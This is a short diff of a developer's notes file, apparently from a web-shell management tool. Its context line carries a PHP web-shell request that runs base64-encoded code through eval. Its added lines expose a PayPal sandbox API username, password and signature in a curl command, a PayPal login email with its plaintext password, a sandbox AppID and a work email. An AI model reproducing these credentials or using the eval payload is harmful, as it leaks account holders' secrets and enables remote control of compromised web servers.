@@ -28,3 +28,34 @@ djzqd9527=@eval(base64_decode($_POST[pass]));&pass=QGluaV9zZXQoImRpc3BsYXlfZXJyb
       File "/opt/WebShellManager/apps/webshell/service.py", line 241, in get_base_info
         raise gen.Return(response)
     UnboundLocalError: local variable 'response' referenced before assignment
+
+
+curl https://api-3t.sandbox.paypal.com/nvp \
+-s \
+--insecure \
+-d USER='zhguo300_api1.kavya1.com' \
+-d PWD='XRLYYEALCFRS84KS' \
+-d SIGNATURE='AmOl9JyR5kSM5t9r.Xersz.6IS9YAXyf1ZcXjqrTS4DUGyEYGg.DvDZv'\
+-d METHOD=SetExpressCheckout \
+-d VERSION=98 \
+-d PAYMENTREQUEST_0_AMT=10 \
+-d PAYMENTREQUEST_0_CURRENCYCODE=USD \
+-d PAYMENTREQUEST_0_PAYMENTACTION=SALE \
+-d cancelUrl=http://127.0.0.1:8000/order/detail \
+-d returnUrl=http://127.0.0.1:8000/order/detail
+
+
+## Paypal {
+    username: 529356441@qq.com
+    password: lin13870965549
+}
+
+
+# Sandbox test AppID:
+APP-80W284485P519543T
+
+
+
+wangbo@youzan.com
+
+
